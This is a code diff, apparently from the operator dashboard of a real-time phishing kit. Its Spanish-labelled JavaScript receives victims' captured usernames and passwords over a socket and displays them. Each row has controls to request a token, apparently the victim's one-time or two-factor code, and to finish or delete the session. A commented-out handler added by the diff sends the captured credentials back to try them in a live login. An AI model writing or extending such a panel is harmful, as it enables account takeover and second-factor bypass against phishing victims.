@@ -9,12 +9,13 @@ const panelData = document.querySelector("#panel-1");
 socket.on("NewData", data => {
     var dataInfo = `<div class="row-data" id="parent-${data.socket}"> 
                         <div class="info-row" id="row-${data.socket}"> 
-                            <p> <b>User:</b> ${data.user} </p>
-                            <p> <b>Pass:</b> ${data.pass} </p>
+                            <p id="u-${data.socket}"> <b>User:</b> ${data.user} </p>
+                            <p id="p-${data.socket}"> <b>Pass:</b> ${data.pass} </p>
                         </div>
                         <div class="buttons-row">
-                            <button class="pedir-token" id="t-${data.socket}">Pedir token</button>
-                            <button class="finalizar" id="f-${data.socket}">Finalizar</button>
+                            <!--<button class="iniciar-sesion" id="l-${data.socket}">Probar data</button>-->
+                            <button class="pedir-token" id="t-${data.socket}" disabled>Pedir token</button>
+                            <button class="finalizar" id="f-${data.socket}" disabled>Finalizar</button>
                             <button class="eliminar" id="d-${data.socket}">Eliminar</button>
                         </div>
                     </div>`
@@ -48,6 +49,16 @@ const on = (element, event, selector, handler) => {
         }
     })
 }
+
+/*on(document, 'click', '.iniciar-sesion', e =>{
+    const id = e.target.id;
+    idUser = id.substring(2);
+    const user = document.querySelector("#u-"+idUser).textContent.substring(7);
+    const pass = document.querySelector("#p-"+idUser).textContent.substring(7);
+    userPass = [user, pass];
+    socket.emit("IniciarSesion", userPass);
+})*/
+
 
 on(document, 'click', '.pedir-token', e =>{
     const id = e.target.id;
